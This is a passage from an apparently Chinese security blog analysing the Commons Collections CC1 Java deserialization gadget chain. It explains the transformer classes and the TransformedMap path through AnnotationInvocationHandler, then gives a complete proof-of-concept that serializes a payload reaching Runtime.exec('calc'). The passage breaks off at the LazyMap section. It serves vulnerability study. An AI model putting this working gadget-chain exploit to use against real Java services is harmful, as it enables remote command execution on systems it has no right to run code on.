id="0x03、利用链接口及实现类"><a href="#0x03、利用链接口及实现类" class="headerlink" title="0x03、利用链接口及实现类"></a>0x03、利用链接口及实现类</h1><p>CC1链的利用点为<code>Commons Collections</code>包中的<code>Transformer</code>接口，通过下面后半段的利用链可以了解<code>Transformer</code>接口相关涉及实现它的<code>ChainedTransformer</code>类、<code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">yso-cc1链后半段利用链</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>&#x2F;&#x2F;我理解为 转换器接口<br><code>Transformer</code>接口只有一个<code>public Object transform(Object input)</code>方法，返回一个被转换的Object对象</p><p><img src="/posts/dd664be3/cc1-6.png" title="Transformer接口"></p><p>Transformer接口实现的类，包括利用链中的关键的类，这些类都实现了<code>Transformer</code>以及序列化<code>serializable</code>。</p><p><img src="/posts/dd664be3/cc1-7.png" title="Transformer实现的类"></p><h2 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h2><p>&#x2F;&#x2F;我理解为 链转换类<br><code>ChainedTransformer</code>的作用为链式调用，将传入的<code>Transformer</code>数组依次调用每一个<code>Transformer</code>的<code>transform</code>方法，将第一个的转换返回<code>Object</code>对象的作为下次循环的的输入对象在<code>Transformer</code>的<code>transform</code>中被调用，以此循环。</p><p><img src="/posts/dd664be3/cc1-8.png" title="ChainedTransformer类"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>&#x2F;&#x2F;我理解为 对象转换类<br>这里定义了一个<code>iConstant</code>对象<br><code>private final Object iConstant;</code></p><p><img src="/posts/dd664be3/cc1-9.png" title="ConstantTransformer类"></p><p>作用就是接受任何传进来的对象，并转换成定义的<code>iConstant</code>对象返回，相对起来很好理解。</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>&#x2F;&#x2F;我理解为 调用转换类<br><code>InvokerTransformer</code>类的作用为获取调用的<font color="red">方法名</font>、<font color="red">参数类型</font>、<font color="red">函数的参数列表</font></p><p><img src="/posts/dd664be3/cc1-10.png" title="InvokerTransformer"></p><p>调用的<code>transform</code>获取了<font color="red">对象的类，方法、并返回执行方法，类、方法</font>、<font color="red">参数均为输入的对象，可控</font>，因此该类是cc1链的最重点的执行部分。</p><p><img src="/posts/dd664be3/cc1-11.png" title="InvokerTransformer"></p><p>通过正常反射执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-12.png" title="正常反射执行exec"></p><p>通过<code>InvokerTransformer</code>类执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-13.png" title="正常反射执行exec"></p><p>poc-demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Runtime run=Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//通过Object对象反射回去Runtime对象</span></span><br><span class="line">        <span class="comment">//Object obj=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        <span class="comment">//获取构造InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//执行InvokerTransformer.transform方法</span></span><br><span class="line">        iv.transform(run);</span><br></pre></td></tr></table></figure><p>这下很好理解<code>InvokerTransformer</code>这个类的就是为了获取对象以及方法和执行参数，且该对象可控。</p><h1 id="0x04、CC1链分析"><a href="#0x04、CC1链分析" class="headerlink" title="0x04、CC1链分析"></a>0x04、CC1链分析</h1><p>从利用链接口和实现类可知<code>InvokerTransformer</code>为最后最重要的执行类，因此该链的分析思路就相对清晰，反查哪些类实现了<code>InvokerTransformer.transform()</code>方法，输入源为反序列化<code>readObject</code>，也就是先搜索最后调用了<code>InvokerTransformer.transform(Object)</code>方法，且实现<code>serializable</code>序列化，以<code>readObject</code>为输入源的类及方法。<br>搜索结果有21个，除去自身测试的，还有20个，满足上述条件（调用<code>transform(Object)</code>、实现了反序列化接口<code>serializable</code>）的有6个类。</p><p><img src="/posts/dd664be3/cc1-14.png" title="满足条件类"></p><p>共8个方法</p><p><img src="/posts/dd664be3/cc1-15.png" title="满足条件类"></p><p>先学习分析一下TransformedMap链和LazyMap链，也就是CC1的两条链。</p><h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>TransformedMap</code>类作用是对Map进行装饰，通过<code>keyTransformer</code>、<code>valueTransformer</code>分别对输入的<code>key</code>、<code>value</code>通过<code>transform()</code>方法进行修饰，查看构造函数，接受三个参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>。），将接受的<code>key，value</code>对象转换为本类的<code>Transformer</code>对象</p><p><img src="/posts/dd664be3/cc1-16.png" title="构造函数"></p><p>可调用静态方法（map类型）<code>decorate</code>对新<code>Map</code>对象进行回调，对传入新的<code>Map</code>进行修饰，也就是说可以通过<code>decorate</code>方法去获取<code>TransformedMap</code>的对象</p><p><img src="/posts/dd664be3/cc1-17.png" title="decorate回调"></p><p>简单了解<code>TransformedMap</code>类后，现在回到利用链本身来，找到可以实现的<code>transform(Object)</code>的地方</p><p><img src="/posts/dd664be3/cc1-18.png" title="decorate回调"></p><p>三个方法</p><ul><li>transformKey(Object object)</li><li>transformValue(Object object)</li><li>checkSetValue(Object value)</li></ul><p>其中<code>transformKey</code>、<code>transformValue</code>两个方法分别获取从<code>TransformedMap</code>类的构造方法中传入<code>Transformer keyTransformer</code>、<code>Transformer valueTransformer</code>，再分别调用<code>keyTransformer.transform(object)</code>、<code>valueTransformer.transform(object)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//transformKey方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transformValue方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看这两个方法都在哪调用</p><p><img src="/posts/dd664be3/cc1-19.png" title="transformKey方法调用"><br><img src="/posts/dd664be3/cc1-20.png" title="transformValue方法调用"></p><p>这两个方法都在put方法中进行调用，参数就为两个<code>Object</code>对象，传递任意一个参数都可调用对应的<code>transformKey/Value</code>方法，最后put放入<code>key</code>和<code>value</code>。</p><p><img src="/posts/dd664be3/cc1-21.png" title="put方法"></p><p>利用思路：<br>因为<code>TransformedMap</code>中构造函数、<code>transformKey</code>、<code>transformValue</code>方法都是<code>protected</code>受保护的，无法直接声明使用，但可调用<code>decorate</code>公共方法进行回调向构造方法传参，通过<code>transformKey</code>或者<code>transformValue</code>传递其中任意一个参数为<code>InvokerTransformer</code>对象，最后通过<code>TransformedMap</code>的<code>put</code>方法传入恶意函数对象达到执行命令。<br>即：<br>第一步，创建构造参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>），其中key或者value可以随意创造其中一个为<code>InvokerTransformer</code>类对象即可<br>第二步，通过<code>decorate</code>公共方法调用构造方法创建<code>TransformedMap</code>对象<br>第三步，调用<code>TransformedMap</code>的<code>put</code>方法，传递恶意函数对象，对其中key和value参数随便传入一个即可<br>利用方法：</p><p><img src="/posts/dd664be3/cc1-22.png" title="利用"></p><p>但上面这两个方法都在本类Put方法进行调用，也未在其他类中进行调用，同时使用到了<code>InvokerTransformer</code>、<code>Map</code>两个类的对象，因此无法通过readObject反序列化达到命令执行的目的。<br><font color="red">注：反序列化的序列化对象只能为单个对象，无法对多个对象进行序列化。</font></p><p>接下来看第三个方法：<code>checkSetValue(Object value)</code></p><p><img src="/posts/dd664be3/cc1-23.png" title="checkSetValue方法"></p><p>同样也是返回构造方法传入的<code>Transformer valueTransformer</code>，然后调用<code>transform(Object)</code>，但是由于是<code>protected</code>受保护，因此无法像另外两个方法一样直接调用。<br>再看该方法有没有其他类对其调用</p><p><img src="/posts/dd664be3/cc1-24.png" title="checkSetValue方法"></p><p>发现除了本类以外的父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，该类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>官方对该类的描述翻译：</p><blockquote><p>一个抽象基类，简化了创建地图装饰器的任务。<br>MapAPI很难正确修饰，并且涉及实现许多不同的类。这个类的存在是为了提供一个更简单的API。<br>提供了特殊的钩子方法，当对象被添加到地图时调用这些方法。通过重写这些方法，可以验证或操纵输入。除了主要的映射方法，entrySet也会受到影响，这是编写映射实现最困难的部分。<br>该类是包范围的，在将来的Commons Collections版本中可能会被撤回或替换</p></blockquote><p>实现调用<br>前面步骤跟另外两个方法一样，由于不能直接调用，因此重点就在for循环里面，通过遍历<code>HashMap</code>键值对（<code>entrySet()</code>为<code>hashMap</code>映射识图，能返回<code>map</code>键值对），调用<code>setValue()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span><br><span class="line">        <span class="comment">//第一个参数Map对象</span></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="comment">//第二个参数和第三个参数类型一致，且有一个即可调用，传入InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//调用decorate实现实例化对象并调用构造函数传参,Map类型必须为&lt;Object,Object&gt;，否则for循环调用tm对象会导致参数类型不一致会报错</span></span><br><span class="line">        Map&lt;Object,Object&gt; tm= TransformedMap.decorate(map,<span class="literal">null</span>,iv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( Map.Entry entry: tm.entrySet()) &#123;</span><br><span class="line">            <span class="comment">//调用setValue，传递Runtime对象</span></span><br><span class="line">            entry.setValue(Runtime.getRuntime()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-25.png" title="实现调用"></p><p>现在发现父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，下一个思路就是找到实现序列化接口并且能调用<code>setValue()</code>方法的</p><p><img src="/posts/dd664be3/cc1-26.png" title="setValue()调用"></p><p>找到42个方法，其中<code>AnnotationInvocationHandler</code>类实现了序列化接口，同时重写了<code>readObject</code>方法，并且<code>setValue()</code>在重写的<code>readObject</code>方法中进行调用<br>其中构造函数获取两个参数，一个class类型<code>Class type</code>,一个Map类型<code>Map memberValues</code>，然后进行了type的类型判断，最后返回给变量</p><p><img src="/posts/dd664be3/cc1-28.png" title="AbstractInputCheckedMapDecorator类"></p><p>序列化前半段也是通过<code>getInstance</code>方法对type类型进行判断,判断type的类型是否为注解类的方法类型名，是的话便通过<code>memberTypes()</code>方法获取其成员方法名和返回方法，存在Map类型的<code>memberTypes</code>对象中</p><p><img src="/posts/dd664be3/cc1-27.png" title="重写序列化方法"></p><p>后半段也是最主要的for循环部分，遍历<code>memberValues</code>也就是构造方法传入的第二个参数（传入TransformedMap[]数组），循环获取键名，通过<code>memberTypes.get(name)</code>判断键名是否是注解类（Annotation类，全名java.lang.annotation.Annotation）的方法类型名，如果是的话就获取键值给<code>value</code>变量，<strong>这里通过键名设置注解类（Annotation类）的实例方法名即可通过条件判断</strong>。<br>接下来继续判断<code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)</code>意思判断value的值如果不是注解类的方法或者键名的值是ExceptionProxy的实例，则通过<code>memberValue.setValue</code>方法修改该键名的值，<strong>这里只用键值不是注解类（Annotation类）的实例方法名即可满足条件判断</strong>，然后调用<code>memberValue.setValue</code>方法达到目的<br>可以找到注解类Annotation的实现方法（找到引用的java.lang.annotation.Annotation，Ctrl+Alt+鼠标左键点击Annotation即可找到对应的实现方法），找到其中对应有成员的任意方法</p><p><img src="/posts/dd664be3/cc1-31.png" title="实现方法"></p><p>比如Generated注释类，可以put value方法名。（实际测试过程中找到的实现方法有大部分还是不能触发，只有部分类和方法才行）</p><p><img src="/posts/dd664be3/cc1-32.png" title="Generated类"></p><p>现在利用链就完整了，入口点为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法，一直到最后调用<code>InvokerTransformer.transform(Object)</code>方法</p><h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>TransformedMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                TransformedMap.entrySet()</span><br><span class="line">                    AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                        TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>其中通过上述学习还没涉及到<code>ChainedTransformer.transform()</code>这个环节的利用方法，在构造Poc中可以学习下利用方法和原理</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>理思路<br>1、入口点在为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法中调用<code>setValue()</code>方法，但<code>AnnotationInvocationHandler</code>这个类未声明Public，只有通过反射进行调用。<br>通过反射调用<code>AnnotationInvocationHandler</code>类对象，并且调用构造方法，然后通过实例化向构造方法传参</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(a,b);</span><br></pre></td></tr></table></figure><p>2、接下来久要对传参内容进行确定，传入什么，其中a为Class类对象，b为Map对象，通过反序列化调用，从利用链的分析知道a传入的为注解类<code>Annotation</code>类，可以找到的<code>Generated</code>类的<code>value</code>名称，同时建立<code>HashMap</code>，并put键名为<code>value</code>，键值为任意即可绕过for循环的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Object obj=cons.newInstance(Generated.class,b);</span><br></pre></td></tr></table></figure><p>b为Map对象，并且该参数会执行调用到<code>AnnotationInvocationHandler</code>类<code>readObject</code>方法中的<code>AbstractMapEntryDecorator.MapEntry.setValue()</code>，从而在<code>setValue()</code>方法中调用到<code>TransformedMap.checkSetValue()</code>方法，最后返回调用到<code>TransformedMap</code>中<code>valueTransformer.transform()</code>方法，<code>valueTransformer</code>为<code>TransformedMap</code>构造函数的第三个参数即传入<code>InvokerTransformer</code>类对象，<code>Runtime</code>对象作为<code>transform(Object)</code>参数传入的值<br>但由于Runtime对象未实现序列化接口，无法序列化，并且<code>valueTransformer.transform(Object)</code>中的Object实际并不可控设置为Runtime对象值。因此利用到了<code>ChainedTransformer</code>类，也是上文学习中未提及实际利用方法的类，该类传入Transformer数组，并由transform方法实现循环调用。</p><p><img src="/posts/dd664be3/cc1-34.png" title="ChainedTransformer类"></p><p>因为<code>Runtime</code>类未实现序列化接口，只有通过反射实现对它的调用，即<code>Runtime.class</code>，再由于这个循环会有一个初识的transform(Object)，其中的Object在第一次循环的时候是由调用<code>ChainedTransformer.transform(Object)</code>传入的（传入的重写的反序列化方法中setValue()中的值），并没有实际传入的类对象。</p><p><img src="/posts/dd664be3/cc1-35.png" title="初始的Object值"></p><p>此时通过调用<code>ConstantTransformer</code>类来解决这个问题，一来可以通过它来实现返回<code>Runtime.class</code>对象，二来通过把他设置为<code>TransformedMap</code>数组的首位来规避初始调用的<code>Object</code>的问题，因为<code>ConstantTransformer</code>的<code>transform(Object)</code>不管输入什么都返回构造方法中的对象，然后再通过反射构建<code>Runtime</code>对象并调用<code>exec</code>方法，最后执行命令。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>在理解<code>ConstantTransformer</code>的<code>transform(Object)</code>方法的实际原理时也挺绕，可以试着把上面的执行效果带入到该方法中，能更好的理解如何实现最后调用到<code>InvokerTransformer</code>方法并传入<code>Runtime</code>对象</p><p><img src="/posts/dd664be3/cc1-33.png" title="transform方法"></p><p>通过一次一次循环把对应<code>Object</code>输出到下次作为输入就能理解怎么实现的了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object = <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(<span class="number">123</span>); </span><br><span class="line"><span class="comment">//= Runtime.class transform中输入任何数字都返回Runtime对象，但还没实例化</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  调用Runtime对象的getRuntime() 但该方法还没执行，只是获取了该方法</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(Runtime.class.getRuntime()) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  执行Runtime.getRuntime() 此时正式实例化了Runtime对象</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.class.getRuntime().invoke())</span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime().exec(&quot;calc&quot;) 执行Runtime.exec()方法</span></span><br></pre></td></tr></table></figure><p>3、在实现了2步骤的一长段的利用链的相关调用，最后就是传递的b就是<code>Transformer transformerChain = new ChainedTransformer(transformers);</code>中的<code>transformerChain</code>数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(Generated.class,transformerChain);</span><br></pre></td></tr></table></figure><p>4、最后就是序列化该<code>AnnotationInvocationHandler</code>对象，反序列化时触发漏洞，得到最终POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 